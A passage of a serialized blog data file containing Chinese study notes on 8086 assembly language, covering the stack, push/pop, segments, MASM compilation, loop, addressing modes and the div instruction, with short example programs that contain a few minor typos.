;将数据段第三个单元（偏移地址为2）中的数值加到al中\n\n部分小结\n\n字在内存中存储时，要用两个地址连续的内存单元来存放，字的低位字节存放在地地址单元中，高位字节存放在高地址单元中。\n用mov指令要访问内存单元，可以在mov指令中只给出单元的偏移地址，此时，段地址默认在DS寄存器中。\n[address]表示一个偏移地址为address的内存单元。\n在内存和寄存器之间传送字符数据时，高地址单元和高8位寄存器、低地址单元和低8位寄存器相对应。\nmov、add、sub是具有两个操作对象的指令。jmp是具有一个操作对象的指令。\n可以根据自己的推测，在Debug中实验指令的新格式。\n\n6. 栈栈是一种具有特殊的访问方式的存储空间。它的特殊性在于，最后进入这个空间的数据，最先出去。\n栈有两个基本的操作：入栈和出栈。\n入栈：将一个新的元素放到栈顶。\n出栈：从栈顶去除一个元素。\n\n栈顶的元素总是最后入栈，需要出栈时，又最先被从栈中取出。\n栈的操作规则：LIFO（Last In First Out， 后进先出）\n7. CPU提供的栈机制\n8086CPU提供入栈和出栈指令：（最基本的）PUSH（入栈）POP（出栈）\n\npush ax：将寄存器ax中的数据送入栈中；pop ax：从栈顶取出数据送入ax。\n8086CPU的入栈和出栈操作都是以字为单位进行的。\nmov ax,0123H\npush ax\nmov bx,2266H\npush bx\nmov cx 1122H\npush cx\npop ax      ;ax&#x3D;1122H\npop bx      ;bx&#x3D;2266H\npop cx      ;cx&#x3D;0123H\n\n两个疑问：\n1.CPU如何知道当前要执行的指令所在的位置？\n答:寄存器CS和IP中存放着当前指令的段地址和偏移地址。\n\n8086CPU中，有两个寄存器：\n段寄存器SS  存放栈顶的段地址\n寄存器SP    存放栈顶的偏移地址\n\n数据-&gt;通用寄存器-&gt;段寄存器\n\n任意时刻，SS:SP指向栈顶元素。\n\n2.执行push和pop的时候，如何知道哪个单元是栈顶单元？\n\npush ax\n· SP&#x3D;SP-2;\n· 将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新栈顶。\n\npop ax\n· 将SS:SP指向的内存单元处的数据送入ax中；\n· SP&#x3D;SP+2,SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶。\n\n注意：出栈后，SS:SP指向新的栈顶，pop操作前的栈顶元素依然存在，但已不在栈中；\n    再次执行push等入栈指令后，会写入新的数据，它将被覆盖。\n\n\n\n任意时刻，SS:SP指向栈顶元素，\n当栈为空的时候，栈中没有元素，也就不存在栈顶元素；\n所以SS:SP只能指向栈的最底部单元下面的单元，\n该单元的偏移地址为栈最底部的字单元的偏移地址+2；\n栈最底部字单元的地址为1000：000E，所以栈空时，SP&#x3D;0010H；\n\n8. 栈顶超界的问题当栈满的时候再使用push指令入栈，栈空的时候再使用pop指令出栈，都将发生栈顶超界问题。\n\n\n\n\n\n\n\n\n\n栈顶超界是危险的。\n9. push、pop指令push和pop指令是可以在寄存器和内存之间传送数据的。\n&lt;!--栈与内存--&gt;\n栈空间当然也是内存空间的一部分，\n它只是一段可以以一种特殊的方式进行访问的内存空间。\n\npush 寄存器：将一个寄存器中的数据入栈；\npop 寄存器：出栈，用一个寄存器接收出栈的数据；\n\npush 段寄存器：将一个段寄存器中的数据入栈；\npop 段寄存器：出栈，用一个段寄存器接收出栈的数据；\n\npush 内存单元：将一个内存单元处的字入栈（栈操作都是以字为单位）；\npop 内存单元：出栈，用一个内存字单元接受出栈的数据；\n例如：\npush[0]\npop[2]\n&lt;!--指令执行时，CPU要知道内存单元的地址，\n可以在push、pop指令中给出内存单元的偏移地址，\n段地址在指令执行时，CPU从 ds 中取得。--&gt;\n\n结论：push、pop实质上就是一种内存传送指令，可以在寄存器和内存之间传送数据，与mov指令不同的是，push和pop指令访问的内存单元的地址不是在指令中给出的，而是由SS:SP指出的。同时，push和pop指令还要改变SP中的内容。\n执行push时：先改变SP，后向SS:SP处传送；执行pop时：先读取SS:SP处的数据，后改变SP；\n注意：push、pop等栈操作指令，修改的只是SP。也就是说，栈顶的变化范围最大为0~FFFFH。\n提示：SS、SP只是栈顶；改变SP后写内存的入栈指令；读内存后改变SP的出栈指令。\n这就是8086CPU提供的栈操作机制。\n10. 栈段我们可以将长度为N（ N &lt;&#x3D; 64K ）的一组 地址连续、起始地址为16的倍数的内存单元，当作栈来用，从而定义了一个栈段。\n任意时刻，SS:SP指向栈顶元素，当栈为空的时候，栈中没有元素，也就不存在栈顶元素，所以SS:SP只能指向栈的最底部单元下面的单元，该单元的偏移地址为栈最底部的字单元的偏移地址+2，栈最底部字单元的地址为1000:FFFE，多以栈空时，SP&#x3D;0000H。\nmov ax,1000H\nmov ss,ax\nmov sp,0020H\nmov ax,cs\nmov ds,ax\nmov ax,[0]\nadd ax,[2]\nmov bx,[4]\nadd bx,[6]\npush ax\npush bx\npop ax\npop bx\n\n一段内存，可以既是代码的存储空间，又是数据的存储空间，还可以是栈空间，也可以什么也不是。关键在于CPU中寄存器的设置，即：CS,IP,SS,SP,DS的指向。\n","slug":"8086汇编_01","date":"2023-07-25T03:20:34.000Z","categories_index":"8086汇编","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"2872e18edcfe70db45537a6abab5f8bb","title":"8086汇编学习笔记_02","content":"汇编语言程序1. 一个源程序从写出到执行的过程&#x2F;&#x2F; 简要过程：\n编写 -&gt; 编译链接 -&gt; 执行\n\n\n执行可执行文件中的程序：操作系统按照可执行文件中的描述信息，将可执行文件中的机器码和数据加载入内存，并进行相关的初始化（比如：设置CS:IP指向第一条要执行的指令），然后由CPU执行程序。\n\n2. 源程序assume cs:codesg\n\ncodesg segment\n\nstart:  mov ax,0123H\n        mov bx,0456H\n        add ax,bx\n        add ax,ax\n\n        mov ax,4c00H\n        int 21h\ncodesg ends\nend\n\n\n汇编指令\n\n有对应的机器码的指令，可以被编译为机器指令，最终为CPU所执行。\n\n\n伪指令\n\n没有对应的机器码的指令，最终不被CPU所执行。\n伪指令是由编译器来执行的指令，编译器根据伪指令来进行相关的编译工作。\n\n\n\n&#x2F;&#x2F; 定义一个段\nsegment和ends是一对成对使用的伪指令，\n这是在写可被编译器编译的汇编程序时，必须要用到的一对伪指令。\nsegment和ends的功能时定义一个段，\nsegment说明一个段开始，ends说明一个段结束。\n\n一个段必须有一个名称来标识，使用格式为：\n段名 segment\n段名 ends\n\n一个汇编程序是由多个段组成的，这些段被用来存放代码、数据或当作栈空间来使用。\n\n一个有意义的汇编程序中至少要有一个短，这个段用来存放代码。\n\n&#x2F;&#x2F; 真正的结束\nend是一个汇编程序的结束标记，编译器在编译汇编程序的过程中，\n如果碰到了伪指令的end，就结束对源程序的编译。\n\n如果程序写完了，要在结尾处加上伪指令end。\n否则编译器在编译程序时，无法知道程序在何处结束。\n\n切记：不要搞混了end和ends。\n\n&#x2F;&#x2F; 寄存器与段的关联假设\nassume：含义为&quot;假设&quot;；\n它假设某一段寄存器和程序中的某一个用segment···ends定义的段相关联。\n通过assume说明这种关联，在需要的情况下，编译程序可以将段寄存器和某一个具体的段相联系。\n\n&#x2F;&#x2F; 源程序中的“程序”\n\n汇编源程序：\n伪指令（编译器处理）\n汇编语言（编译为机器码）\n\n程序：源程序中最终由计算机执行、处理的指令或数据。\n\n&#x2F;&#x2F; 标号\n一个标号指代了一个地址；\n\ncodesg:放在segment的前面，作为一个段的名称，\n这个段的名称最终将被编译、链接程序处理为一个段的段地址。\n\n&#x2F;&#x2F; 程序返回\n应该在程序的末尾添加返回的程序段。\nmov ax,4c00H\nint 21H\n&#x2F;&#x2F; 这两条指令所实现的功能就是程序返回。\n\n\n&#x2F;&#x2F; 语法错误和逻辑错误\n语法错误，程序在编译时被编译器发现的错误，容易发现；\n逻辑错误，程序在编译时不能表现出来的、在运行时发生的错误；\n\n3. 编辑源程序assume cs:abc\n\nabc segment\n    mov ax,2\n    add ax,ax\n    add ax,ax\n\n    mov ax,4c00H\n    int 21H\nabc ends\n\nend\n\n 一般来说，有两类错误使我们得不到所期望的目标文件：\n\n我们程序中有“Server Errors”；\n找不到所给出的源程序文件；\n\n4. 以简化的方式进行编译和链接&#x2F;&#x2F; 对源程序进行编译连接：\n使用汇编语言编译程序（MASM.EXE）对源程序文件中的源程序进行编译，产生目标文件【.obj文件】\n再用连接程序（LINK.EXE）对目标文件进行连接，生成可在操作系统中直接运行的可执行文件【.EXE文件】\n\n例：\nmasm 1.asm;\nlink 1.obj\n或\nml 1.asm\n\n关于编译和链接链接的作用：\n\n当源程序很大时，可以将它分为多个源程序文件来编译，每个源程序编译成为目标文件后，再用链接程序将它们链接到一起，生成一个可执行文件；\n程序中调用了某个库文件中的子程序，需要将这个库文件和该程序生成的目标文件链接到一起，生成一个可执行文件；\n一个源程序编译后，得到了存有机器码的目标文件，目标文件中的有些内容还不能直接用来生成可执行文件，连接程序将这些内容处理为最终的可执行信息；\n所以在只有一个源程序文件，而又不需要调用某个库中的子程序的情况下，也必须用连接程序对目标文件进行处理，生成可执行文件；\n\n5. 可执行文件中的程序装入内存并运行的原理1. 在 DOS 中，可执行文件中的程序 P1 若要运行，必须有一个正在运行的程序 P2，\n将 P1 从可执行文件中加载入内存，将 CP U的控制权交给P1，P1 才能得以运行；\n\n2. 当 P1 运行完毕后，应该将 CPU 的控制权交还给使他得以运行的程序；\n\n3. 操作系统的外壳：\n（1）操作系统是由多个功能模块组成的庞大、复杂的软件系统，任何通用的操作系统，\n都需要提供一个称为 shell（外壳）的程序，用户（操作人员）使用这个程序来操作计算机系统工作；\n（2）DOS 中有一个程序 command.com，这个程序在 DOS 中称为命令解释器，也就是 DOS 系统的 shell；\n \n4. 执行可执行文件 1.exe 时，\n（1）什么程序将 CPU 的控制权交给了 1.exe？\n（2）将程序 1.exe 加载入内存后，如何使程序得以运行？\n（3）1.exe 程序运行结束后，返回到了哪里？\n答：\n（1）在 DOS 中直接执行 1.exe 时，是正在运行的 cmd.exe 将 1.exe 中的程序加载入内存；\n（2）cmd.exe 设置 CPU 的 CS:IP 指向程序的第一条指令（即，程序的入口），从而使程序得以运行；\n（3）程序运行结束后，返回 cmd.exe 中，CPU 继续运行 cmd.exe；\n\n\n6. 程序执行过程的跟踪assume cs:codesg\n\ncodesg segment\n\nstart:  mov ax,0123H\n        mov bx,0456H\n        add ax,bx\n        add ax,ax\n\n        mov ax,4c00H\n        int 21H\ncodesg ends\n\nend start\n\nEXE文件中的程序的加载过程\n\n程序加载后，ds 中存放着程序所在内存区的段地址，这个内存区的偏移地址为 0 ，则程序所在的内存区的地址为：ds:0；\n\n这个内存区的前256个字节中存放的是 PSP，dos 用来和程序进行通信；\n\n从 256 字节处向后的空间存放的是程序；\n\n所以，我们从 ds 中可以得到 PSP 的段地址 SA，PSP 的偏移地址为 0，则物理地址为 SA×16+0；\n\n因为 PSP 占 256（100H）字节，所以程序的物理地址是：SA×16+0+256&#x3D; SA×16+16×16&#x3D;（SA+16）×16+0，可用段地址和偏移地址表示为：SA+10:0；\n\n\n","slug":"8086汇编_02","date":"2023-07-25T03:20:34.000Z","categories_index":"8086汇编","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"aa3313a82f9ba24855cce6bcccfff26c","title":"8086汇编学习笔记_03","content":"bx和loop指令1. [bx]和内存单元的描述assume cs:codesg\n\ncodesg segment\n\nfishcc:     mov ax, 2000H\n            mov ds, ax\n            mov al, [0]\n            mov bl, [1]\n            mov cl, [2]\n            mov dl, [3]\n\n            mov ax, 4C00H\n            int 21H\n\ncodesg ends\n\nend fishcc\n\n[bx]和[0]有些类似，[0]表示内存单元，它的偏移地址是0.mov ax,[0]mov al,[0]\n我们要完整地描述一个内存单元，需要两种信息：\n\n内存单元的地址；\n内存单元的长度（类型）。\n\n我们用[0]表示一个内存单元时，0表示单元的偏移地址，段地址默认在ds中，单元的长度（类型）可以由具体指令中的其他操作对象（比如说寄存器）指出，如前面的AX,AL。\n[bx]同样也表示一个内存单元，它的偏移地址在bx中，比如下面的指令:\n\nmov ax [bx]\nmov al [bx]\n\n2. loop指令英文单词”loop”有循环的含义，显然这个指令和循环有关。\n指令的格式是：loop 标号，CPU执行loop指令的时候，要执行两步操作：\n\n(cx)&#x3D;(cx)-1；\n判断cx中的值，不为零则转至标号处执行程序，如果为零则向下执行。\n\n通常，我们用loop指令来实现循环功能，cx中存放循环次数。\n编程计算2^12\n\n程序代码：\nassume cs:code\n\ncode segment\n\nstart:  mov ax,2\n    mov cx,11\ns:  add ax,ax\n    loop s\n\n    mov ax,4c00H\n    int 21H\n\ncode ends\n\nend start\n\n\n在cx中从存放循环次数；\nloop指令中的标号所识别地址要在前面；\n要循环执行的程序段，要写在标号和loop指令的中间。\n\n&lt;!-- 描述性符号&quot;()&quot; --&gt;\n1. ax中的内容为0010H，我们可以这样来描述：(ax)&#x3D;0010H；\n2. 2000:1000处的内容为0010H，我们可以这样来描述：(21000H)&#x3D;0010H；\n3. 对于mov ax,[2]的功能，我们可以这样来描述：(ax)&#x3D;((ds)*16+2)；\n4. 对于mov [2],ax的功能，我们可以这样来描述：((ds)*16+2)&#x3D;(ax)；\n5. 对于add ax,2的功能，我们可以这样来描述：(ax)&#x3D;(ax)+2；\n6. 对于add ax,bx的功能，我们可以这样来描述：(ax)&#x3D;(ax)+(bx)；\n7. 对于push ax的功能，我们可以这样来描述：\n(sp)&#x3D;(sp)-2\n((ss)*16+(sp))&#x3D;(ax)\n1. 对于pop的功能，我们可以这样来描述:\n(ax)&#x3D;((ss)*16+(sp))\n(sp)&#x3D;(sp)+2\n\n&lt;!-- 约定符号idata表示常量 --&gt;\n我们在Debug中写过类似的指令：mov ax,[0]，表示将ds:0处的数据送入ax中。\n指令中，在&quot;[...]&quot;里用一个常量0表示内存单元的偏移地址。\n以后，我们用idata表示常量。\n\n例如：\nmov ax,[idata]就代表mov ax,[1]、mov ax,[2]、mov ax,[3]等。\nmov bx,idata就代表mov bx,1、mov bx,2、mov bx,3等。\nmov ds,idata就代表mov ds,1、mov ds,2等，它们都是非法指令。\n\n在汇编源程序中，数据不能以字母开头，所以要在前面加0。\n3. [bx]mov ax,[bx]功能：bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中，将SA:EA处的数据送入ax中。即：(ax)&#x3D;((ds)*16+(bx))；\nmov [bx],ax功能：bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中，将ax中的数据送入内存SA:EA处。即：((ds)*16+(bx))&#x3D;(ax)\n[bx]的作用：作为偏移地址与DS配合\n4. Debug和汇编编译器Masm对指令的不同处理在Debug中，mov ax,[0]表示将ds:0处的数据送入al中。但是在汇编源程序中，指令”mov ax,[0]”被编译器当作指令”mov ax,0”处理。\n字节单元送入字节单元中。\n\n在MASM中，mov ax,[2]是解释为mov ax,2的。一般我们是通过BX来代替，我们可以先mov bx,2，在通过mov ax,[bx]来实现。当然也可以向DEBUG一样直接用[2]，不过要加上段地址，例如 mov ax,段地址:[2]。\n&#x2F;&#x2F; 对比以下指令分类：\nmov al,[0] \nmov al,ds:[0]\nmov al,[bx]\nmov al,ds:[bx]\n\nloop和[bx]的联合应用类型的匹配和结果的不超界\n6. 段前缀指令”mov ax,[bx]”中，内存单元的偏移地址由bx给出，而段地址默认在ds中。我们可以在访问内存单元的指令中显式地给出内存单元的段地址所在的段寄存器。这些出现在访问内存单元的指令中，用于显式地指明内存单元的段地址的”ds:”,”cs:”,”ss:”或”es:”，在汇编语言中称为段前缀。\n7. 一段安全的空间在8086模式中，随意向一段内存空间写入内容是很危险的，因为这段空间可能从存放着重要的系统数据或代码。\n在一般的PC机中，DOS方式下，DOS和其他合法的程序一般都不会使用0:200 ~ 0:2FF (0:200h ~ 0:2FFh) 的256个字节的空间。所以，我们使用这段空间是安全的。\n8. 段前缀的应用&#x2F;&#x2F; 效率不高\nassume cs:code\ncode segment\n    mov bx,0\n    mov cx,12\ns:  mov ax,0ffffh\n    mov ds,as\n    mov dl,[bx]\n    mov ax,0020h\n    mov ds,ax\n    inc bx\n    loop s\n\n    mov ax,4c00h\n    int 21h\ncode ends\nend\n\n&#x2F;&#x2F; 改进代码\nassume cs:code\ncode segment\n    mov ax,0ffffh\n    mov ds,ax\n    mov ax,0020h\n    mov es,ax\n    mov bx,0\n    mov cx,12\ns:  mov dl,[bx]\n    mov es:[bx],dl\n    inc bx\n    loop s\n\n    mov ax,4c00h\n    int 21h\ncode ends\nend\n","slug":"8086汇编_03","date":"2023-07-25T03:20:34.000Z","categories_index":"8086汇编","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"27759c8c14f50cd48e39f238bf5dbaa8","title":"8086汇编学习笔记_04","content":"包含多个段的程序1. 在代码段中使用数据dw 的含义是定义字型数据。\n因为dw定义的数据处于代码段的最开始，所以偏移地址为0。\nassume cs:codesg\ncodesg segment\n    dw 0123h,0456h,0789h,0abc,0def,0fedh,0cbah,0987h\nstart:  mov bx,0\n        mov ax,0\n        mov cx,8\n    s:  add ax,cs:[bx]\n        add bx,2\n        loop s\n        mov ax,4c00h\n        int 21h\ncodesg ends\nend start\n\n2. 在代码段中使用栈完成下面的程序，利用栈，将程序中定义的数据逆序存放。\nassume cs:codesg\ncodesg segment\n    dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h\n    dw 0,0,0,0,0,0,0,0\n\nstart:  mov ax,cs\n        mov ss,ax\n        mov sp,32\n        mov bx,0\n        mov cx,8\n    s:  push cs:[bx]\n        add bx,2\n        loop s\n\n        mov bx,0\n        mov cx,8\n    s0: pop cs:[bx]\n        add bx,2\n        loop s0\n\n        mov ax,4c00h\n        int 21h\ncodesg ends\nend start\n\n3. 将数据，代码，栈放入不同的段我们用和定义代码段一样的方法来定义多个段，然后在这些段里面定义需要的数据，或通过定义数据来取得栈空间。\nassume cs:code,ds:data,ss:stack\ndata segment\n    dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h\ndata ends\n\nstack segment\n    dw 0,0,0,0,0,0,0,0\nstack ends\n\ncode segment\nstart:  mov ax,stack\n        mov ss,ax\n        mov sp,16\n        mov ax,data\n        mov ds,ax\n        mov bx,0\n        mov cx,8\n    s:  push [bx]\n        add bx,2\n        loop s\n\n        mov bx,0\n        mov cx,8\n    s:  pop [bx]\n        add bx,2\n        loop s0\n\n        mov ax,4c00h\n        int 21h\ncode ends\n\nend start\n\n更灵活定位内存地址1. and和or指令and指令：逻辑与指令，按位进行与运算。通过该指令可将操作对象的相应位设为0，其他位不变。\nor指令：逻辑或指令，按位进行或运算。通过该指令可将操作对象的相应位设为1，其他位不变。\n2. 关于ASCII吗assume ds:data\ndata segment\n    db &#39;unIX&#39;\n    db &#39;foRK&#39;\n    data ends\n\ncode segment\n    start:  mov al,&#39;a&#39;\n            mov bl,&#39;b&#39;\n            mov ax,4c00h\n            int 21h\ncode ends\n\nend start\n\n3. 大小写转换的问题要改变一个字母大小，实质就是改变它所对应的ascii码，小写字母的ascii码值比大写字母的ascii码值大20H。\n一个字母，我们不管它原来是大写还是小写：我们将它的第5位置0，它就必将变为大写字母；将它的第5位置1，它就必将变为小写字母。\n要将一个字母的第5位设置为0，可以使用按位与（AND）操作。\n将变量的值与一个掩码进行按位与操作，使第5位为0，其他位保持不变。\n掩码为 0xDF（二进制：11011111）。\n\n例如，如果变量的值是 &#39;a&#39;，其ASCII码为 97（二进制：01100001），\n与掩码按位与之后，变量的值变为 65（二进制：01000001），即大写字母 &#39;A&#39;。\n\n要将一个字母的第5位设置为1，可以使用按位或（OR）操作。\n将变量的值与一个掩码进行按位或操作，使第5位为1，其他位保持不变。\n掩码为 0x20（二进制：00100000）。\n\n例如，如果变量的值是 &#39;A&#39;，其ASCII码为 65（二进制：01000001），\n与掩码按位或之后，变量的值变为 97（二进制：01100001），即小写字母 &#39;a&#39;。\n\n4. [bx+idata][bx+idata]表示一个内存单元，它的偏移地址为(bx)+idata (bx中的数值加上idata)\n指令mov ax,[bx+200]也可以写成如下格式(常用):\nmov ax,[200+bx]\nmov ax,200[bx]\nmov ax,[bx].200\n\n5. 用[bx+idata]的方式进行数组的处理[bx+idata]的方式为高级语言实现数组提供了便利机制。\nchar a[5] &#x3D; &quot;BaSiC&quot;;\nchar b[5] &#x3D; &quot;minIX&quot;;\nmain()\n&#123;\n    int i;\n    i &#x3D; 0;\n    do\n    &#123;\n        a[i] &#x3D; a[i] &amp; 0xDF;\n        b[i] &#x3D; b[i] | 0x20;\n        i++;\n    &#125; while(i &lt; 5);\n&#125;\n\n6. SI和DISI和DI是8086CPU中和bx功能相近的寄存器，SI和DI不能够分成两个8位寄存器来使用。\n&#x2F;&#x2F; 下面的三组指令实现了相同的功能：\nmov bx,0\nmov ax,[bx]\n\nmov si,0\nmov ax,[si]\n\nmov di,0\nmov ax,[di]\n\n&#x2F;&#x2F; 下面的三组指令实现了相同的功能：\nmov bx,0\nmov ax,[bx+123]\n\nmov si,0\nmov ax,[si+123]\n\nmov di,0\nmov ax,[di+123]\n\n7. [bx+si]和[bx+di][bx+si]表示一个内存单元，它的偏移地址位(bx)+(si)。即bx中的数值加上si中的数值。\n指令 mov ax,[bx+si] 的含义：将一个内存单元的内容送入ax，这个内存单元的长度为2字节（字单元），存放一个字，偏移地址为bx中的数值加上si中的数值，段地址在ds中。\n指令mov ax,[bx+si]的数学化的描述为：\n（ax）&#x3D;（（ds）* 16 +（bx）+（si））\n\n该指令也可以写成如下格式（常用）：\nmov ax,[bx][si]\n\n8. [bx+si+idata]和[bx+di+idata][bx+si+idata]和[bx+si+idata]的含义相似。\n指令mov ax，[bx+si+idata]的含义：将一个内存单元的内容送入ax，这个内存单元的长度为2字节（字单论），存放一个字，偏移地址为bx中的数值加上si中的数值再加上idata，段地址在ds中。\n数学化的描述为：\n(ax)&#x3D;( (ds)*16+(bx)+(si)+idata )\n\n9. 不同的寻址方式的灵活应用\n[idata]用一个常量来表示地址，可用于直接定位一个内存单元；\n[bx]用一个变量来表示内存地址，可以用于间接定位一个内存单元；\n[bx+idata]用一个变量和常量表示地址，可在一个起始地址的基础上用变量间接定位一个内存单元；\n[bx+si]用两个变量表示地址；\n[bx+si+idata]用两个变量和一个常量表示地址。\n\n&#x2F;&#x2F; 编程，将datasg段中每个单词的头一个字母改为大写字母。\nassume cs:codesg,ds:datasg\ndatasg segment\n    db &#39;1. file         &#39;\n    db &#39;2. edit         &#39;\n    db &#39;3. serch        &#39;\n    db &#39;4. view         &#39;\n    db &#39;5. options      &#39;\n    db &#39;6. help         &#39;\ndatasg ends\n\ncodesg segment\nstart:  mov ax,datasg\n        mov ds,ax\n        mov bx,0\n\n        mov cx,6\n    s:  mov al,[bx+3]\n        and al,11011111b\n        mov [bx+3],al\n        add bx,16\n        loop s\n\n        mov ax,4c00h\n        int 21h\ncodesg ends\nend start\n\nsi,cx,ax,bx显然不能用来暂存cx中的值，因为这些寄存器在循环中也要时使用；cs，ip，ds也不能用，因为cs:ip时刻指向当前指令，ds指向datasg段；可用的就只有：dx,di,es,ss,sp,bp等6个寄存器了。\n这些数据可能是寄存器中的，也可能是内存中的。\n我们可以用寄存器暂存它们，但是这不是一个一般化的解决方案，因为寄存器的数量有限，每个程序中可使用的寄存器都不一样。\nassume cs:codesg,ds:datasg\n\ndatasg segment\n    db &#39;ibm.............&#39;\n    db &#39;dec.............&#39;\n    db &#39;dos.............&#39;\n    db &#39;vax.............&#39;\n    dw 0        ;定义一个字，用来保存cx\ndatasg ends\n\ncodesg segment\nstart:  mov ax,datasg\n        mov ds,ax\n\n        mov bx,0\n\n        mov cx,4\ns0:     mov ds:[40H],cx     ;将外层循环的cx值保存在datasg:40H单元中\n        mov si,0\n        mov cx,4            ;cx设置为内存循环的次数\ns:      mov al,[bx+si]\n        and al,11011111b\n        mov [bx+si],al\n        inc si\n        loop s\n\n        add bx,16\n        mov cx,ds:[40H]     ;用datasg:40H单元中的值恢复cx\n        loop s0             ;外层循环的loop指令将cx中的计数值减1\n\n        mov ax,4c00h\n        int 21h\ncodesg ends\nend start\n\n一般来说，在需要暂存数据的时候，我们应该使用栈。\nassume cs:codesg,ds:datasg\n\ndatasg segment\n    db &#39;ibm.............&#39;\n    db &#39;dec.............&#39;\n    db &#39;dos.............&#39;\n    db &#39;vax.............&#39;\ndatasg ends\n\nstacksg segment             ;定义一个段，用来作栈段，容量为16字节\n    dw 0,0,0,0,0,0,0,0\nstacksg ends\n\ncodesg segment\nstart:  mov ax,stacksg\n        mov ss,ax\n        mov sp,16\n        mov ax,datasg\n        mov ds,ax\n\n        mov bx,0\n\n        mov cx,4\ns0:     push cx             ;将外层循环的cx值压栈\n        mov si,0\n        mov cx,4            ;cx设置为内存循环的次数\ns:      mov al,[bx+si]\n        and al,11011111b\n        mov [bx+si],al\n        inc si\n        loop s\n\n        add bx,16\n        pop cx              ;从栈顶淡出原cx的值，恢复cx\n        loop s0             ;外层循环的loop指令将cx中的计数值减1\n\n        mov ax,4c00h\n        int 21h\ncodesg ends\nend start\n","slug":"8086汇编_04","date":"2023-07-25T03:20:34.000Z","categories_index":"8086汇编","tags_index":"8086汇编","author_index":"南瓜の无名"},{"id":"02e063a90486ef4cde640d9e32f1b93d","title":"8086汇编学习笔记_05","content":"数据处理的两个基本问题用reg表示一个寄存器，用sreg表示一个段寄存器。\nreg的集合包括：ax,bx,cx,dx,ah,al,bh,bl,ch,cl,dh,dl,sp,bp,si,di;\nsreg的集合包括：ds,ss,cs,es；\n1. bx、si、di、bp\n在8086CPU中，只有这4个寄存器（bx、bp、si、di）可以用在”[…]”中来进行内存单元的寻址；\n在”[…]”中，这4个寄存器（bx、bp、si、di）可以单个出现，或只能以四种组合出现：bx和si、bx和di、bp和si、bp和di；\n只要在[…]中使用寄存器bp，而指令中没有显性的给出段地址，段地址就默认在ss中；\n\n2. 机器指令处理的数据所在位置绝大部分机器指令都是进行数据处理的指令，处理大致可分为三类：读取，写入，运算。\n指令在执行前，所要处理的数据可以在三个地方：CPU内部、内存、端口。\n3. 汇编语言中数据位置的表达汇编语言中用三个概念来表达数据的位置：\n\n立即数（idata）\n寄存器\n段地址（SA）和偏移地址（EA）\n\n4. 寻址方式\n5. 指令要处理的数据有多长？8086CPU的指令，可以处理两种尺寸的数据，byte（8）和word（16）。所以在机器指令中要指明，指令进行的是字操作还是字节操作。\n\n通过寄存器名指明要处理的数据的尺寸。\n在没有寄存器名存在的情况下，用操作符X ptr指明内存单元长度，X在汇编指令中可以为word或byte。–&gt; 例：mov word ptr ds:[0],1\n其他方法。有些指令默认了访问的是字单元还是字节单元，例如push指令只进行字操作。\n\nmov byte ptr [1000H],1 访问的是地址为ds:1000H的字节单元，修改的是 ds:1000H单元的内容；而 mov word ptr [1000H],1 访问的是地址为ds:1000H的字单元，修改的是ds:1000H和ds：1001H两个单元的内容。\n6. 寻址方式的综合应用情境中要修改的数据：1、DEC公司的排名字段2、DEC公司的收入字段3、DEC公司的产品字段，这个是字符的\n汇编代码如下：\nmov ax,seg\nmov ds,ax\nmov bx,60h                ;确定记录的地址：ds：bx\nmov word ptr [bx+0ch],38  ;排名字段改成38\nadd word ptr [bx+0eh],70  ;收入字段增加70\n​\nmov si,0                  ;用si来定位产品字符串中的字符\nmov byte ptr [bx+10h+si],&#39;V&#39;\ninc si\nmov byte ptr [bx+10h+si],&#39;A&#39;\ninc si\nmov byte ptr [bx+10h+si],&#39;X&#39;\n\nc语言代码如下：\nstruct company\n&#123;\n char cn[3];  &#x2F;&#x2F;定义公司的名称\n char hn[9];  &#x2F;&#x2F;定义总裁姓名\n int pm;      &#x2F;&#x2F;排名\n int sr;      &#x2F;&#x2F;收入\n char cp[3];  &#x2F;&#x2F;著名产品\n&#125;;\n​\nstruct company dec &#x3D; &#123;&quot;DEC&quot;,&quot;Ken Olsen&quot;,137,40,&quot;PDF&quot;&#125;;\n​\nint main()\n&#123;\n int I;\n dec.pm &#x3D; 38;\n dec.sr &#x3D; dec.sr + 70;\n i &#x3D; 0;\n dec.cp[i] &#x3D; &#39;V&#39;;\n I++;\n dec.cp[i] &#x3D; &#39;A&#39;;\n I++;\n dec.cp[i] &#x3D; &#39;X&#39;;\n&#125;\n\n二者对比：\nmov ax,seg\nmov ds,ax\nmov bx,60h \nmov word ptr [bx+0ch],38  ;C: dec.pm &#x3D; 38;\nadd word ptr [bx+0eh],70  ;C: dec.sr &#x3D; dec.sr + 70;\n​\nmov si,0                  ;C: i &#x3D; 0;\nmov byte ptr [bx+10h+si],&#39;V&#39;  ;C: dec.cp[i] &#x3D; &#39;V&#39;;\ninc si                      ;C: i++;\nmov byte ptr [bx+10h+si],&#39;A&#39;  ;C: dec.cp[i] &#x3D; &#39;A&#39;;\ninc si                      ;C: i++;\nmov byte ptr [bx+10h+si],&#39;X&#39;  ;C: dec.cp[i] &#x3D; &#39;X&#39;;\n\n总结：\n\n我们可以看到，8086CPU提供的如[bx+si+idata]的寻址方式为结构化数据的处理提供了方便，使得我们可以在编程的时候从结构化的角度去看待所要处理的数据；\n一般来说，我们可以用[bx+si+idata]的方式来访问结构体中的数据；\n用bx来定位整个结构体，用idata定位结构体中的某一个数据项，用si定位数组项中的每个元素，如：[bx].idata、[bx].idata[si]；\n\n7. div指令div是除法指令，使用div作除法的时候：除数：8位或16位，在寄存器或内存单元中；被除数：（默认）放在AX或DX和AX中；\n对应：\n\n\n\n除数\n被除数\n\n\n\n8位\n16位（AX）\n\n\n16位\n32位（DX+AX）\n\n\n结果：\n\n\n\n运算\n8位\n16位\n\n\n\n商\nAL\nAX\n\n\n余数\nAH\nDX\n\n\ndiv指令示例:\ndiv byte ptr ds:[0]\n含义为： (al)&#x3D;(ax)&#x2F;((ds)*16+0)的商；\n        (ah)&#x3D;(ax)&#x2F;((ds)*16+0)的余数\n\ndiv word ptr es:[0]\n含义为： (ax)&#x3D;[(dx)*10000H+(ax)]&#x2F;((ds)*16+0)的商；\n        